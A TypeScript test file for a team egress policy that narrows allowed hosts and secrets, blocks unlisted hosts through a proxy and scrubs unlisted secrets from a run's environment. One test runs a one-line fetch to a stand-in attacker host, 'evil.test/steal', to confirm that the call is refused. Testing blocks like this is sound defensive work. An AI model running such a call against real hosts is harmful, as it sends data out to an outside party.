import { afterEach, describe, expect, test } from "bun:test";
import { cpSync, mkdirSync, mkdtempSync, readFileSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { WrapExecution } from "../src/adapters/wrap/execution";
import { loadConfig } from "../src/config";
import { startEgressProxy } from "../src/egress";
import { restrictSpec, scrubEnv } from "../src/team/egress-policy";
import { resolveTeam } from "../src/team/resolve";
import { teamProblems } from "../src/team/schema";

const policy = { hosts: ["api.allowed.test"], secrets: ["ALLOWED_TOKEN"] };
const saved = { ...process.env };
afterEach(() => {
  for (const k of ["ALLOWED_TOKEN", "OTHER_TOKEN"]) delete process.env[k];
  Object.assign(process.env, saved);
});

describe("team egress policy", () => {
  test("a team can narrow the org's hosts and secrets, never widen them", () => {
    const { values } = resolveTeam({
      builtin: {},
      org: { name: "o", policy: { egress: { hosts: ["a.test", "b.test"], secrets: ["K1"] } } },
      team: { name: "t", policy: { egress: { hosts: ["b.test", "c.test"], secrets: ["K1", "K2"] } } },
    });
    expect((values.policy as { egress: unknown }).egress).toEqual({ hosts: ["b.test"], secrets: ["K1"] });
  });

  test("the schema takes lists of strings and names a bad one", () => {
    expect(teamProblems({ name: "t", policy: { egress: { hosts: ["a.test"] } } }, "team")).toEqual([]);
    expect(teamProblems({ name: "t", policy: { egress: { hosts: "a.test" } } }, "team").join(" ")).toContain(
      "policy.egress.hosts must be a list of strings",
    );
  });

  test("an allowed host is reached and a blocked host is refused by name", async () => {
    const upstream = Bun.serve({ port: 0, fetch: () => new Response("ok") });
    const spec = restrictSpec(
      { kind: "wrap", argv: ["bash", "-c", "{cmd}"], allow: ["api.allowed.test", "evil.test"] },
      policy,
    );
    const allow = spec.kind === "wrap" ? (spec.allow ?? []) : [];
    const proxy = startEgressProxy({ allow, upstream: (h) => `http://127.0.0.1:${upstream.port}/${h}` });
    try {
      expect((await fetch(`${proxy.url}/api.allowed.test/x`)).status).toBe(200);
      expect((await fetch(`${proxy.url}/evil.test/x`)).status).toBe(403);
      expect(proxy.refused).toEqual(["evil.test is not on the allow-list"]);
    } finally {
      proxy.stop();
      upstream.stop(true);
    }
  });

  test("a run that calls an unlisted host has it named in its stderr", async () => {
    const spec = restrictSpec({ kind: "wrap", argv: ["bash", "-c", "{cmd}"], allow: ["evil.test"] }, policy);
    const run = await new WrapExecution(spec as never).run(
      `bun -e 'await fetch(process.env.HTTPS_PROXY + "/evil.test/steal")'`,
      process.cwd(),
    );
    expect(run.stderr).toContain("egress blocked: evil.test is not on the allow-list");
  });

  test("a secret that is not listed is absent from the run environment", async () => {
    process.env.ALLOWED_TOKEN = "listed-value";
    process.env.OTHER_TOKEN = "unlisted-value";
    const spec = restrictSpec({ kind: "wrap", argv: ["bash", "-c", "{cmd}"] }, policy);
    const run = await new WrapExecution(spec as never).run("env", process.cwd());
    expect(run.stdout).toContain("ALLOWED_TOKEN=listed-value");
    expect(run.stdout).not.toContain("OTHER_TOKEN");
    expect(run.stdout).not.toContain("unlisted-value");
    expect(Object.keys(scrubEnv({ A_KEY: "1", PLAIN: "2" }, []))).toEqual(["PLAIN"]);
  });

  test("microsandbox secrets drop unless the policy lists them and a listed host carries them", () => {
    const spec = restrictSpec(
      {
        kind: "microsandbox",
        image: "i",
        allow: ["api.allowed.test", "evil.test"],
        secrets: ["ALLOWED_TOKEN@api.allowed.test,evil.test", "OTHER_TOKEN@api.allowed.test"],
      },
      policy,
    );
    expect(spec).toMatchObject({ allow: ["api.allowed.test"], secrets: ["ALLOWED_TOKEN@api.allowed.test"] });
  });

  test("a spec with no allow list gets no host under a policy, and no policy changes nothing", () => {
    const wrap = { kind: "wrap" as const, argv: ["x", "{cmd}"] };
    expect(restrictSpec(wrap, policy)).toMatchObject({ allow: [] });
    expect(restrictSpec(wrap, undefined)).toBe(wrap);
  });

  test("the team file's policy reaches config.egress", async () => {
    mkdirSync(tmpdir(), { recursive: true });
    const dir = mkdtempSync(join(tmpdir(), "team-egress-"));
    cpSync(join(import.meta.dir, "fixtures/team-repo"), dir, { recursive: true });
    const file = join(dir, ".factory/team/teams/core.yml");
    writeFileSync(
      file,
      `${readFileSync(file, "utf8")}  egress:\n    hosts: [api.allowed.test]\n    secrets: [ALLOWED_TOKEN]\n`,
    );
    expect((await loadConfig(dir)).egress).toEqual(policy);
  });
});
